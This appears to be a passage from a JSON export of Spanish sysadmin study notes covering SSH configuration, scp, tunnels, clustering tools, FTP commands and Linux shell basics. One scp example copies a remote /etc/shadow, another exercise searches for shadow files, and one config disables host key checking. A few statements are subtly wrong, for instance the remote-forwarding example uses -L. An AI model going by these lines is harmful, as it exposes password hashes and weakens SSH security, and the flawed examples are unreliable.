cliente, siempre que estos estén definidos allí. Por ejemplo, supongamos que la variable local sea LANG=es.ES.UTF-8, seguirá siendo en el equipo remoto siempre que exista, en caso contrario se pondrá la localización por defecto del sistema:\r\n\r\n```sh\r\nusuario@cliente:~$ echo $LANG\r\nes_ES.UTF-8\r\nusuario@cliente:~$ ssh root@servidor1\r\n\r\nThe programs included with the Debian GNU/Linux system are free software;\r\nthe exact distribution terms for each program are described in the\r\nindividual files in /usr/share/doc/*/copyright.\r\n\r\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\r\npermitted by applicable law.\r\nNo mail.\r\nLast login: Thu Feb 22 10:06:47 2018 from ...\r\nroot@servidor1:~# echo $LANG\r\nen_US.UTF-8\r\n```\r\n\r\n### HashKnownHosts yes|no\r\n\r\nPara ofuscar mediante un hash la IP o el nombre de los servidores de los que almacenamos las claves públicas en el fichero ~/.ssh/known_hosts\r\n\r\n### GSSAPIAuthentication yes|no\r\n\r\nPara habilitar este método de autenticación, en sistemas Debian viene habilitado, aunque sólo es necesario en los casos en los que se vaya a usar este método de autenticación.\r\n\r\n### Carácter de escape\r\n\r\nEn algunas ocasiones podemos tener problemas con nuestra conexión ssh y que la shell remota no responda a las instrucciones que mandamos, en esos casos siempre se podrá cerrar la conexión mediante el carácter de escape que hayamos definido en nuestro cliente ssh, este caracter por defecto es “~”:\r\n\r\n`EscapeChar ~`\r\n\r\nPara ejecutarlo escribiríamos la secuencia “~.”\r\n\r\n### ForwardAgent, ForwardX11\r\n\r\nExplicados en la sección específica de forwarding\r\n\r\n### GlobalKnownHostsFile fichero\r\n\r\nPermite la utilización de un fichero known_hosts para todos los\r\nusuarios de un equipo.\r\n\r\n### NumberOfPasswordPrompts\r\n\r\nNúmero de intentos de acceso con contraseña. Por defecto es 3\r\n\r\n### StrictHostKeyChecking yes|ask|no\r\n\r\nParámetro muy importante, utiliza para la gestión de las claves públicas de los equipos remotos. La opción por defecto es “ask”, de manera que si no se ha almacenado previamente la clave pública se pregunta qué hacer. En el caso de ponerla en “yes”, se rechazará una conexión si no existe previamente la clave pública y en caso de optar por la opción “no”, no se hará ninguna verificación.\r\n\r\n### UserKnownHostsFile fichero\r\n\r\nFichero known_hosts de usuario, por defecto ~/.ssh/known_hosts\r\n\r\n### Configuración por usuario\r\n\r\nSalvo algunos parámetros generales, es poco probable que la mayoría de los parámetros que se pueden definir para el cliente ssh sean útiles para todos los usuarios de un equipo, es mucho más habitual que un usuario defina un fichero de configuración con sus propios parámetros. Este fichero es ~/.ssh/config y los parámetros aquí definidos prevalecen sobre los generales.\r\n\r\nSe pueden definir parámetros para todos los equipos remotos, pero es también muy útil agruparlos con el parámetro Host como en el siguiente ejemplo:\r\n\r\n```sh\r\nGSSAPIAuthentication no\r\n\r\nHost 192.168.1.1\r\n     User root\r\n     Port 2022\r\n     ForwardAgent yes\r\n     Identityfile ~/.ssh/id_ecdsa\r\n     StrictHostKeyChecking yes\r\n\r\nHost *.example.com\r\n     StrictHostKeyChecking no\r\n     UserKnownHostsFile=/dev/null\r\n     LogLevel QUIET\r\n```\r\n\r\n### Utilizar parámetros directamente\r\n\r\nIndependientemente de los parámetros que estén definidos en cualquiera de las opciones anteriores, también es posible utilizar parámetros de forma explícita en la propia línea de comandos, pasándolos mediante el modificador “-o”, por ejemplo:\r\n\r\n`ssh -o \"ForwardAgent yes\" usuario@172.22.200.175`\r\n\r\n## Configuración del servidor\r\n\r\nTal como vimos en la instalación y configuración elemental del servidor ssh, podemos ver las opciones de configuración que se aplican a nuestro servidor mediante:\r\n\r\n`sshd -T |less`\r\n\r\nVamos a comentar algunas que pueden ser interesantes porque se modifican con cierta frecuencia.\r\n\r\n### Port 22\r\n\r\nPuerto tcp en el qu va a escuchar peticiones el servidor ssh, por defecto es el 22/tcp, pero puede cambiarse sin problema.\r\n\r\n### AddressFamily any|inet|inet6\r\n\r\nEl protocolo o protocolos de red a utilizar, puede ser inet(IPv4), inet6 (IPv6) o any(ambos) que es la opción por defecto.\r\n\r\n### ListenAddress\r\n\r\nSi queremos especificar que se permitan conexiones sólo a través de una dirección IP concreta (IPv4/IPv6).\r\n\r\n### logingracetime, maxauthtries y maxsessions\r\n\r\nPara especificar el tiempo que se espera para que el usuario se acceda con éxito al sistema, el número máximo de veces que puede introducir la contraseña y el número máximo de sesiones en la misma conexión.\r\n\r\n### loglevel y syslogfacility\r\n\r\nPara controlar el nivel de detalle que mostrar en los logs del sistema, así como la “facility” a utilizar.\r\n\r\n### hostkey\r\n\r\nFichero o ficheros que especifican la clave o claves privadas a utilizar por el servidor.\r\n\r\n## Utilización de SCP\r\n\r\nEl cliente ssh incluye también el comando “scp” que permite copiar ficheros entre entre equipos mediante ssh y hacerlo de forma equivalente a la utilización local del clásico comando “cp”.\r\n\r\nNo es necesario que el equipo origen o destino sea el equipo desde el que se ejecuta scp, tanto origen como destino pueden ser equipos a los que pueda acceder el usuario utilizando ssh.\r\n\r\nLa sintaxis general de scp es:\r\n\r\n`scp [[user@]host1:]file1 [[user@]host2:]file2`\r\n\r\n### Transferir un fichero local a un equipo remoto\r\n\r\n`scp /etc/resolv.conf usuario@172.22.200.175:resolv.conf.local`\r\n\r\nEl fichero remoto quedará como /home/usuario/resolv.conf.local ya que : indica el punto de acceso al equipo (/home/usuario/ en este caso)\r\n\r\n### Transferir un fichero desde un equipo remoto a mi equipo local\r\n\r\n`scp root@172.22.200.175:/etc/shadow .`\r\n\r\nQue guardaría el fichero /etc/shadow del equipo remoto con el nombre shadow en el directorio en el que nos encontramos\r\n\r\n### Transferir un fichero entre dos equipos remotos\r\n\r\n`scp root@172.22.200.175:/etc/hosts root@172.22.200.176:/etc/hosts`\r\n\r\nEsta opción es muy potente y permite crear sencillos scripts para unificar configuraciones, por ejemplo imaginemos que queremos tener la misma configuración DNS en un conjunto de servidores, podríamos hacerlo de forma sencilla y potente con ssh mediante el siguiente script:\r\n\r\n```sh\r\n#!/bin/bash\r\n\r\nfor i in `seq 1 100`; do\r\n  scp root@servidor1:/etc/resolv.conf 192.168.1.$i:/etc/resolv.conf\r\ndone\r\n```\r\n\r\n### Bonus track\r\n\r\nSi utilizamos pares de claves en las conexiones, scp autocompleta el fichero origen o destino utilizando el doble tabulador\r\n\r\n## SFTP\r\n\r\nAl igual que scp, sftp permite transferir ficheros entre equipos remotos a través de SSH, aunque su principal diferencia es que sftp permite utilizarlo de una forma interactiva, al igual que el tradicional ftp, incluyendo los mismos comandos que éste. scp es mucho más habitual utilizarlo desde línea de comandos, mientras que sftp se puede utilizar bien desde la línea de comandos o a través de uno de los múltiples clientes ftp que lo soportan.\r\n\r\nEs importante no confundir sftp (ssh ftp) con ftps que es una extensión del protocolo ftp añadiendo ssl para el cifrado de la conexión.\r\n\r\n## Túneles SSH\r\n\r\nEsta técnica, también conocida como TCP forwarding o port forwarding, permite utilizar cualquier aplicación de forma segura a través de una conexión ssh (de ahí la utilización del término túnel).\r\n\r\n### Local forwarding\r\n\r\nDesde nuestra máquina queremos acceder a un servicio, pero este servicio o bien no es accesible (por ejemplo por un cortafuegos que lo impide), o no es seguro hacerlo desde nuestra máquina, pero tenemos acceso a otro equipo a través de ssh y desde ese equipo sí podemos acceder al servicio que queremos o es seguro hacerlo. Vamos a verlo con un ejemplo: queremos enviar un correo desde nuestro servidor de la empresa (puerto 25/tcp), pero estamos fuera y no queremos conectarnos de forma insegura, por lo que establecemos un túnel ssh de la siguiente forma:\r\n\r\n`ssh -f -L 1025:smtp.example.com:25 remoto.example.com -N`\r\n\r\n```sh\r\n# Cerrar el proceso del tunel\r\nkill <id-proceso>\r\n```\r\n\r\nEsto abrirá el puerto 1025/tcp en nuestra máquina que podremos utilizar de forma segura para enviar correo, ya que se pasará a través de ssh al equipo remoto.example.com y de ahí al servidor smtp.example.com.\r\n\r\n### Remote forwarding\r\n\r\nSupongamos el caso contrario, en el que queremos que una máquina remota utilice un servicio de nuestra máquina, pero o bien no es accesible de forma directa o bien no es seguro hacerlo, por lo que podríamos definir una conexión ssh para realizarlo como la siguiente:\r\n\r\n`ssh -f -L 8080:localhost:80 remoto.example.com -N`\r\n\r\nDe esa manera desde el equipo remoto, quien acceda al puerto 8080/tcp estará accesiendo al puerto 80/tcp de nuestra máquina a través de un túnel ssh.\r\n\r\nLa directiva “GatewayPorts yes|no” limita el puerto 8080 del caso anterior a que se pueda acceder sólo desde el propio equipo remoto, o bien desde cualquier equipo.\r\n\r\n### Forwarding dinámico\r\n\r\nMediante este mecanismo, lo que hacemos es crear un servidor SOCKS en nuestro equipo, que permite utilizar desde nuestra máquina cualquier cliente que soporte este mecanismo, en particular un navegador web. Definiríamos un servidor socks local que sale a través de un túnel ssh con un equipo remoto de la siguiente forma:\r\n\r\n`ssh -D 8080 -f -C -q -N remote.example.com`\r\n",
    "path": "/servers/protocols/SSH/0referencia"
  },
  {
    "id": 62,
    "title": "disponibilidad-rendimiento",
    "content": "\r\nReferencia: [http://www.revistasbolivianas.org.bo/scielo.php?script=sci_arttext&pid=S1234-12342014000100004&lng=es&nrm=iso](http://www.revistasbolivianas.org.bo/scielo.php?script=sci_arttext&pid=S1234-12342014000100004&lng=es&nrm=iso)\r\n\r\n## Alta disponibilidad\r\n\r\nLa alta disponibilidad permite que un servicio funcione correctamente ante un fallo software o hardware.\r\nSe puede implementar mediante dos configuraciones:\r\n\r\n- **Hardware**: uso de sistemas redundantes de alimentación, discos duros (RAID), de red, etc. Si algo falla el sistema seguirá funcionando y el dispositivo defectuso se cambia en caliente.\r\n- **Software**: varios servidores denominados \"nodos\" conectados entre sí de manera que, ante un fallo hardware/software, el servicio o servicios ofrecidos por el nodo fallido son retomados por otro nodo del clúster.\r\n\r\n![http://www.revistasbolivianas.org.bo/img/revistas/jit/n14/a04_figura03.gif](http://www.revistasbolivianas.org.bo/img/revistas/jit/n14/a04_figura03.gif)\r\n\r\n---\r\n\r\n## Alto rendimiento\r\n\r\nEl alto rendimiento permite distribuir la carga de un servicio entre varios equipos.\r\nUn cluster de alto rendimiento esta compuesto por nodos, y cada nodo se encarga de realizar una serie de tareas que se van distribuyendo dependiendo de diversos factores: equipos activos, rendimiento, etc.\r\n\r\n**Características importantes:**\r\n\r\n- Evita la saturación de la máquina\r\n- Recursos gestionados de manera inteligente repartiendo tareas entre los nodos para impedir la sobrecarga\r\n- Mayor capacidad de gestión\r\n- Escalabilidad\r\n- Ampliación\r\n\r\n![http://www.revistasbolivianas.org.bo/img/revistas/jit/n14/a04_figura04.gif](http://www.revistasbolivianas.org.bo/img/revistas/jit/n14/a04_figura04.gif)\r\n\r\n---\r\n\r\n## Herramientas\r\n\r\n**De servicios**\r\n\r\nLa alta disponibilidad de servicios suele ir acompañada de ciertos complementos para un correcto funcionamiento como pueden ser: direccionamiento IP, reglas de firewall, copias de seguridad, etc. Por ejemplo, un servicio de \"directorio activo\" donde deben acceder todos los usuarios de la red.\r\n\r\n**De datos**\r\n\r\nLa alta disponibilidad de datos es fundamental y suele estar integrada con la de servicios. Debe disponer de varias localizaciones de los datos consiguiendo consistencia e integridad.\r\n\r\n| Nombre                       | Alta disponibilidad | Alto rendimiento | Características | Licencia    | URL                                                     |\r\n| ---------------------------- | ------------------- | ---------------- | --------------- | ----------- | ------------------------------------------------------- |\r\n| DRBD                         | X                   | X                | Datos           | GPLv2       | https://linbit.com/drbd/                                |\r\n| FreeNAS                      | X                   | X                | NAS             | BSD         | www.freenas.org                                         |\r\n| Openfiler                    | X                   | X                | SAN-NAS         | GPLv2       | www.openfiler.org                                       |\r\n| NAS Lite-2                   | X                   | X                | NAS             | Propietario | www.serverelements.com/naslite-2-usb.php                |\r\n| Mdadm                        | X                   | X                | RAID            | GPLv2       | http://neil.brown.name/blog/mdadm                       |\r\n| MySQL Replication            | X                   |                  | Base de datos   | GPLv2       | http://dev.mysql.com/doc/refman/5.0/es/replication.html |\r\n| Slony-l                      | X                   |                  | Base de datos   | BSD         | www.slony.info                                          |\r\n| HA-OSCAR                     | X                   |                  | Servicio        | GPL         | http://xcr.cenit.latech.edu/ha-oscar/                   |\r\n| Linux-HA                     | X                   |                  | Servicio        | GPL         | www.missioncriticallinux.com/projects/kimberlite/       |\r\n| Kimberlite                   | X                   |                  | Servicio        | GPL         | www.missioncriticallinux.com/projects/kimberlite/       |\r\n| LifeKeeper                   | X                   |                  | Servicio        | Propietario | www.steeleye.com                                        |\r\n| HP Serviceguard              | X                   |                  | Servicio        | Propietario | https://docs.hp.com/es/5991-1233/ch05s09.html           |\r\n| RedHat Cluster Server        | X                   | X                | Servicio        | Propietario | www.redhat.com/cluster_suite/                           |\r\n| Veritas Cluster Server       | X                   |                  | Servicio        | Propietario | www.symantec.com/es/mx/business/cluster-server          |\r\n| KeepAlived                   | X                   |                  | Servicio        | GPL         | www.keepalived.org                                      |\r\n| Linux Virtual Server         |                     | X                | Servicio        | GPL         | www.linuxvirtualserver.org                              |\r\n| Linux Virtual Server Manager |                     | X                | Servicio        | GPL         | www.linuxvirtualserver.org                              |\r\n| UltraMonkey                  | X                   | X                | Servicio        | GPL         | www.ultramonkey.org                                     |\r\n| Bind9                        |                     | X                |\r\n",
    "path": "/systems/disponibilidad-rendimiento"
  },
  {
    "id": 63,
    "title": "ftp-comandos",
    "content": "\r\n|COMANDO USO|Ejecuta macro|\r\n|---|---|\r\n|account| Envía comando a la cuenta del servidor remoto|\r\n|append| Concatena un archivo|\r\n|bell| Sonido de campanilla cuando el comando se ha completado|\r\n|case| Mapeo de letras iguales|\r\n|cdup| Cambiar al directorio padre en el servidor remoto|\r\n|cr| Retorno de carro|\r\n|debug| Configura modo de errores|\r\n|form| Configurar formato de transferencia de archivos|\r\n|glob| Transponer nombre de archivo local con un metacarácter|\r\n|hash| Imprimir el metacarácter \"#\" por cada buffer transferido|\r\n|idle| Configurar el tiempo disponible en el lado remoto|\r\n|image| Para configurar y transferir archivos tipo binario|\r\n|less| Ver el contenido de un archivo pudiendo subir y bajar por el mismo mediante las flechas|\r\n|macdef| Define una macro|\r\n|mdir| Lista contenido de varios directorios remotos|\r\n|mls| Lista contenido de varios directorios remotos|\r\n|mode| Configura el modo de transferencia|\r\n|modtime| Modo de reloj|\r\n|newer| Recibe el archivo remoto si es más nuevo que el de la máquina local|\r\n|nlist| Lista el contenido de varios directorios remotos|\r\n|nmap| Configura nombre de archivo de acuerdo a plantilla|\r\n|ntrans| Configura tabla de traducción para mapeo de nombres de archivos|\r\n|prompt| Fuerza la ejecución de múltiples comandos|\r\n|proxy| Comando para conexión alternativa|\r\n|sendport| Activa/desactiva use del comando PORT para cada conexión de de datos|\r\n|set||\r\n|site| Envia un comando específico a la máquina remota|\r\n|size| Muestra el tamaño de un archivo|\r\n|struct| Configura la estructra de la transferencia de los archivos|\r\n|sunique| Activa/desactiva almacenamiento único sobre la máquina remota|\r\n|tenex| Transferencia de archivos de tipo tenex|\r\n|trace| Activa/desactiva trazado de transferencia de paquetes|\r\n|type| Configura el tipo de archivo a transferir|\r\n|user| Envia información de usuario nuevo|\r\n|verbose| Activa/Desactiva modo de entrega de información complet|",
    "path": "/systems/ftp-comandos"
  },
  {
    "id": 64,
    "title": "Preparación del entorno",
    "content": "\r\n# Preparación del entorno\r\n\r\nPreparación del entorno de aprendizaje.\r\n\r\n- [Índice curso Linux](./static/Indice+curso+Linux.pdf)\r\n- [Distribuciones Linux](https://upload.wikimedia.org/wikipedia/commons/1/1b/Linux_Distribution_Timeline.svg)\r\n\r\n## Herramientas de virtualización\r\n\r\n- VMWare\r\n- VirtualBox\r\n\r\n## Entornos MacOS\r\n\r\nPara la arquitectura Apple Silicon (ARM64) se debe instalar una distribución compatible, tipo ubuntu ARM (que se utiliza tambien para raspberry)\r\n- [Ubuntu ARM](https://ubuntu.com/download/server/arm)",
    "path": "/systems/linux/environment"
  },
  {
    "id": 65,
    "title": "Sistema de ficheros Avanzado",
    "content": "\r\n# Sistema de ficheros Avanzado\r\n\r\n## Inodos\r\n\r\nLos inodos son estructuras de datos que almacenan información sobre los archivos y directorios en un sistema de archivos. Cada archivo o directorio tiene un inodo único que contiene información sobre el archivo o directorio, como los permisos, el propietario, el grupo, el tamaño, la fecha de creación, la fecha de modificación, la fecha de acceso, el número de enlaces, el tipo de archivo y los punteros a los bloques de datos.\r\n\r\n```sh\r\n# Listar inodos\r\ndf -i\r\n# Ver el inodo de un archivo en un sistema de archivos específico\r\ndf -i /mnt\r\n# Ver el inodo de un archivo\r\nls -i archivo\r\n# Ver el inodo de un archivo avanzado\r\nls -lia archivo\r\n# Ver estadísticas del inodo de un archivo\r\nstat archivo\r\n# Ver estadísticas del inodo de un archivo avanzado\r\nsudo debugfs -R \"stat <inodo>\" /dev/sda1\r\n```\r\n\r\n## Dentries\r\n\r\nLos dentries son estructuras de datos que almacenan información sobre los archivos y directorios en un sistema de archivos. Cada archivo o directorio tiene un dentry único que contiene información sobre el archivo o directorio, como el nombre, el inodo, el tipo de archivo y los punteros a los bloques de datos.\r\n\r\n>Diferencia entre inodo y dentry:\r\n> - inodo: información sobre el archivo o directorio\r\n> - dentry: información sobre el nombre del archivo o directorio\r\n\r\n```sh\r\n# Ver el inodo de un directorio\r\nls -id directorio\r\n# Ver estadísticas de un dentry de un directorio\r\nstat directorio\r\n# Ver estadísticas de un dentry de un directorio avanzado\r\nls -lid directorio\r\n```\r\n\r\n## Enlaces simbólicos\r\n\r\nUn enlace simbólico, también conocido como \"symlink\" o \"enlace blando\", es un archivo especial que actúa como un puntero o referencia a otro archivo o directorio. Es similar a un atajo en Windows.\r\n- Referencia: Un enlace simbólico contiene una ruta al archivo o directorio al que apunta.\r\n- Independencia del archivo original: Si el archivo original es eliminado, el enlace simbólico se queda \"roto\" y apunta a una ruta inexistente.\r\n- Diferentes sistemas de archivos: Los enlaces simbólicos pueden apuntar a archivos ubicados en diferentes sistemas de archivos.\r\n- Permisos: Los permisos del enlace simbólico no afectan al archivo destino, ya que el sistema operativo sigue los permisos del archivo o directorio al que apunta.\r\n\r\n```sh\r\n# Crear un enlace simbólico\r\nln -s archivo enlace\r\n```\r\n\r\n## Enlaces duros\r\n\r\nUn enlace duro es una entrada de directorio que apunta directamente a los datos de un archivo en el sistema de archivos. Todos los enlaces duros a un archivo comparten el mismo contenido.\r\n\r\n- Compartir inodo: Un enlace duro es otra entrada de directorio que apunta al mismo inodo (y por lo tanto a los mismos datos) que el archivo original.\r\n- Mismo sistema de archivos: Los enlaces duros solo pueden existir dentro del mismo sistema de archivos.\r\n- Inmutabilidad del contenido: Si uno de los enlaces duros se modifica, todos los enlaces reflejarán los cambios porque apuntan a los mismos datos.\r\n- Eliminación: El archivo solo se elimina del sistema de archivos cuando el último enlace duro se elimina.\r\n\r\n```sh\r\n# Crear un enlace duro\r\nln archivo enlace\r\n```\r\n\r\n## Wildcards\r\n\r\nLos \"wildcards\" o comodines son caracteres especiales que se utilizan para hacer coincidir patrones de nombres de archivos y directorios en la línea de comandos.\r\n\r\n- `*`: Coincide con cualquier número de caracteres.\r\n- `?`: Coincide con un solo carácter.\r\n- `[]`: Coincide con un solo carácter de los especificados entre corchetes.\r\n- `[!...]`: Coincide con un solo carácter que no está en la lista especificada entre corchetes.\r\n- `{...}`: Coincide con uno de los patrones especificados entre llaves.\r\n- [[:upper:]]: Coincide con un solo carácter en mayúsculas.\r\n- [[:lower:]]: Coincide con un solo carácter en minúsculas.\r\n- [[:digit:]]: Coincide con un solo dígito.\r\n- [[:alnum:]]: Coincide con un solo carácter alfanumérico.\r\n- [[:alpha:]]: Coincide con un solo carácter alfabético.\r\n- [[:space:]]: Coincide con un solo carácter de espacio en blanco.\r\n\r\n    \r\n```sh\r\n# Listar archivos que empiezan por \"a\"\r\nls a*\r\n# Listar archivos que terminan en \".txt\"\r\nls *.txt\r\n# Listar archivos que empiezan por \"a\" y terminan en \".txt\"\r\nls a*.txt\r\n# Listar archivos que empiezan por \"a\" o \"b\"\r\nls [ab]*\r\n# Listar archivos que empiezan por \"a\" o \"b\" y terminan en \".txt\"\r\nls [ab]*.txt\r\n# Listar archivos que empiezan por \"a\" o \"b\" y terminan en \".txt\" o \".md\"\r\nls [ab]*.{txt,md}\r\n# Listar archivos que empiezan por \"a\" o \"b\" y terminan en \".txt\" o \".md\" excluyendo \"a.txt\"\r\nls [ab]*.{txt,md} | grep -v a.txt\r\n```\r\n\r\n## Shell Expansions\r\n\r\nLas \"shell expansions\" o expansiones de la shell son mecanismos que permiten expandir o generar listas de archivos y directorios en la línea de comandos.\r\n\r\n- `*`: Expande a todos los archivos y directorios en el directorio actual.\r\n- `?`: Expande a un solo carácter.\r\n- `[]`: Expande a un solo carácter de los especificados entre corchetes.\r\n- `{...}`: Expande a una lista de palabras separadas por comas.\r\n- `~`: Expande al directorio de inicio del usuario actual.\r\n- `$HOME`: Expande al directorio de inicio del usuario actual.\r\n- `$USER`: Expande al nombre de usuario actual.\r\n- `$PWD`: Expande al directorio actual.\r\n- `$OLDPWD`: Expande al directorio anterior.\r\n- `$PATH`: Expande a la lista de directorios de búsqueda de comandos.\r\n- `$SHELL`: Expande al intérprete de comandos actual.\r\n- `$0`: Expande al nombre del script o comando actual.\r\n- `$1`, `$2`, ...: Expande a los argumentos del script o comando actual.\r\n\r\n```sh\r\necho fichero*\r\necho ~\r\necho *\r\necho /*/log\r\necho $((2+2))\r\necho {1,2,3}\r\necho {01..20}\r\necho {A..Z}\r\necho texto{A{1,2},B{3,4}}\r\nmkdir {2020..2024}-{01..12}\r\n```\r\n\r\n## Command Substitution\r\n\r\nLa \"command substitution\" o sustitución de comandos es un mecanismo que permite ejecutar un comando y utilizar su salida como argumento de otro comando.\r\n\r\n- `$(...)`: Ejecuta el comando entre paréntesis y sustituye su salida.\r\n- ``...``: Ejecuta el comando entre comillas invertidas y sustituye su salida.\r\n\r\n```sh\r\necho $(ls)\r\necho $(date)\r\nls -la $(which cat)\r\necho $(python3 -c 'print(\"Hello, World!\")')\r\n```\r\n\r\n## Comillas en la Shell\r\n\r\nLas comillas en la shell se utilizan para agrupar palabras y evitar la expansión de caracteres especiales.\r\n\r\n>$ ` \\ se interpretan dentro de las comillas dobles, pero no dentro de las comillas simples.\r\n\r\n- Comillas simples (`'...'`): Evitan la expansión de caracteres especiales.\r\n- Comillas dobles (`\"...\"`): Permiten la expansión de variables y comandos.\r\n\r\n```sh\r\necho 'Hello, World!'\r\necho \"Hello, $USER!\"\r\necho \"Today is $(date).\"\r\necho $(ls)\r\necho \"$(ls)\"\r\n# Escapar caracteres especiales\r\necho \"Hello, \\\"World\\\"!\"\r\necho 'Hello, \"World\"!'\r\necho \"Expansion: $USER, Sin expansion: \\$USER\"\r\n# Crear un fichero de nombre: \"fichero espacio.txt\"\r\nls -la fichero\\ espacio.txt\r\necho -e \"Este texto \\t esta tabulado\"\r\necho -e \"Esto es una \\nnueva línea\"\r\n```\r\n",
    "path": "/systems/linux/file-system-advanced"
  },
  {
    "id": 66,
    "title": "Sistema de ficheros",
    "content": "\r\n# Sistema de ficheros\r\n\r\n## Shell. Listado de directorios y archivos\r\n\r\n```sh\r\n# listar directorios y archivos\r\nls\r\n# listar directorios y archivos con detalle\r\nls -l\r\n# listar directorios y archivos con detalle y tamaño\r\nls -lh\r\n# listar directorios y archivos con detalle y tamaño en formato legible\r\nls -lah\r\n# listar directorios y archivos con detalle y tamaño en formato legible y ordenados por fecha\r\nls -lhat\r\n# listar directorios y archivos con detalle y tamaño en formato legible y ordenados por fecha en orden inverso\r\nls -lhart\r\n```\r\n\r\n## Shell. Crear directorios y ficheros\r\n\r\n```sh\r\n# Crear directorio\r\nmkdir directorio\r\n# Crear directorio con subdirectorios\r\nmkdir -p directorio/subdirectorio\r\n# Crear fichero\r\ntouch fichero\r\n# Crear fichero con contenido\r\necho \"contenido\" > fichero\r\n# Crear fichero con contenido y añadir contenido\r\necho \"contenido\" >> fichero\r\n```\r\n\r\n## Shell. Editores de texto\r\n\r\n```sh\r\n# nano\r\nnano fichero\r\n# vim\r\nvim fichero\r\n# emacs\r\nemacs fichero\r\n# pico\r\npico fichero\r\n```\r\n\r\n## Shell. Visualizar contenido de ficheros\r\n\r\n```sh\r\n# Tipo de contenido del fichero\r\nfile fichero\r\n# Visualizar contenido de fichero\r\ncat fichero\r\n# Visualizar contenido de fichero con número de línea\r\ncat -n fichero\r\n# Visualizar contenido de fichero con número de línea y mostrar caracteres no imprimibles\r\ncat -T fichero\r\n# Visualizar contenido de fichero con número de línea y mostrar caracteres no imprimibles\r\ncat -Tn fichero\r\n# Visualizar linea a linea\r\nmore fichero\r\n# Visualizar linea a linea avanzado\r\nless fichero # h ayuda, q salir, /buscar, n siguiente, N anterior\r\n\r\n```\r\n\r\n## Shell. Copiar, mover y borrar ficheros\r\n\r\n```sh\r\n# Copiar fichero\r\ncp fichero destino\r\n# Copiar fichero con detalle\r\ncp -v fichero destino\r\n# Copiar fichero con detalle y confirmación\r\ncp -vi fichero destino\r\n# Actualizar fichero\r\ncp -u fichero destino\r\n```\r\n\r\n## Shell. Copiar, mover y borrar directorios\r\n\r\n```sh\r\n# Copiar directorio\r\ncp -r directorio destino\r\n# Copiar directorio con detalle\r\ncp -rv directorio destino\r\n# Copiar directorio con detalle y confirmación\r\ncp -rvi directorio destino\r\n# Actualizar directorio\r\ncp -ru directorio destino\r\n```\r\n\r\n## Shell. Mover ficheros y directorios\r\n\r\n```sh\r\n# Mover fichero\r\nmv fichero destino\r\n# Mover fichero con detalle\r\nmv -v fichero destino\r\n# Mover fichero con detalle y confirmación\r\nmv -vi fichero destino\r\n# Actualizar fichero\r\nmv -u fichero destino\r\n```\r\n\r\n## Shell. Borrar ficheros y directorios\r\n\r\n```sh\r\n# Borrar fichero\r\nrm fichero\r\n# Borrar fichero con detalle\r\nrm -v fichero\r\n# Borrar fichero con detalle y confirmación\r\nrm -vi fichero\r\n# Borrar fichero con detalle y confirmación forzoso\r\nrm -rfvi fichero\r\n# Borrar directorio\r\nrm -r directorio\r\n# Borrar directorio con detalle\r\nrm -rv directorio\r\n# Borrar directorio con detalle y confirmación\r\nrm -rvi directorio\r\n# Borrar directorio con detalle y confirmación forzoso\r\nrm -rfvi directorio\r\n```\r\n\r\n## Shell. Encontrar ficheros y directorios\r\n\r\n```sh\r\n# Encontrar fichero\r\nfind directorio -name fichero\r\n# Encontrar directorio\r\nfind directorio -type d -name subdirectorio\r\n# Encontrar ficheros excluyendo un directorio concreto\r\nfind directorio -name fichero -not -path \"directorio/excluir\"\r\n# Encontrar fichero con detalle\r\nfind directorio -name fichero -ls\r\n# Encontrar fichero con detalle y permisos\r\nfind directorio -name fichero -ls -perm 777\r\n# Encontrar fichero ocultando errores\r\nfind directorio -name fichero 2> /dev/null\r\n# Encontrar fichero por usuario\r\nfind directorio -name fichero -user usuario\r\n# Encontrar ficheros con tamaño mayor a 1M\r\nfind directorio -size +1M\r\n# Encontrar ficheros con tamaño menor a 1M\r\nfind directorio -size -1M\r\n# Encontrar ficheros con tamaño igual a 1M\r\nfind directorio -size 1M\r\n# Encontrar ficheros con tamaño mayor a 1M y menor a 2M\r\nfind directorio -size +1M -size -2M\r\n# Encontrar ficheros con tamaño mayor a 1M y menor a 2M con detalle\r\nfind directorio -size +1M -size -2M -ls\r\n# Encontrar ficheros que contienen texto\r\ngrep -r \"texto\" directorio\r\n# Encontrar ficheros que contienen texto con detalle\r\ngrep -r \"texto\" directorio -n\r\n# Encontrar ficheros que terminan en .txt\r\nfind directorio -name \"*.txt\"\r\n```\r\n\r\n## Shell. Ejercicios de búsqueda\r\n    \r\n```sh\r\n# Buscar el comando ls\r\nfind / -name ls 2> /dev/null\r\n# Buscar directorios con nombre firefox \r\nfind / -name firefox -type d 2> /dev/null\r\n# Buscar el usuario propietario del fichero shadow excluyendo los ficheros que se encuentren el el directorio /snap\r\nfind / -name shadow ! -path \"/snap/*\" -ls 2> /dev/null\r\nfind / -path /snap -prune -o -name shadow -exec ls -l {} \\ 2>/dev/null\r\n```\r\n\r\n## Shell. Principales directorios de Linux\r\n\r\n```sh\r\n# Arbol de directorios de primer nivel\r\ntree / -L 1\r\n```\r\n\r\nInformación de los principales directorios de Linux:\r\n- `/bin`: Contiene los binarios de los comandos básicos del sistema.\r\n- `/boot`: Contiene los ficheros necesarios para el arranque del sistema.\r\n- `/dev`: Contiene los ficheros de dispositivos.\r\n- `/etc`: Contiene los ficheros de configuración del sistema.\r\n- `/home`: Contiene los directorios de los usuarios.\r\n- `/lib`: Contiene las librerías compartidas.\r\n- `/media`: Contiene los puntos de montaje de los dispositivos extraíbles.\r\n- `/mnt`: Contiene los puntos de montaje de los dispositivos.\r\n- `/opt`: Contiene los paquetes de software adicionales.\r\n- `/proc`: Contiene información sobre los procesos del sistema.\r\n- `/root`: Contiene el directorio del usuario root.\r\n- `/run`: Contiene los ficheros temporales del sistema.\r\n- `/sbin`: Contiene los binarios de los comandos del sistema.\r\n- `/srv`: Contiene los datos de los servicios.\r\n- `/sys`: Contiene información sobre el sistema.\r\n- `/tmp`: Contiene los ficheros temporales.\r\n- `/usr`: Contiene los ficheros de los usuarios.\r\n- `/var`: Contiene los ficheros variables del sistema.\r\n\r\n# Shell. Tips\r\n\r\n```sh\r\n# Proceso actual\r\necho $$\r\n# Último proceso\r\necho $!\r\n# Último comando\r\necho $?\r\n# Ver procesos en ejecución\r\nps\r\n# Limitar la memoria de un proceso concreto por su PID\r\nprlimit --as=1000 --pid 1234\r\n```",
    "path": "/systems/linux/file-system"
  },
  {
    "id": 67,
    "title": "Introducción",
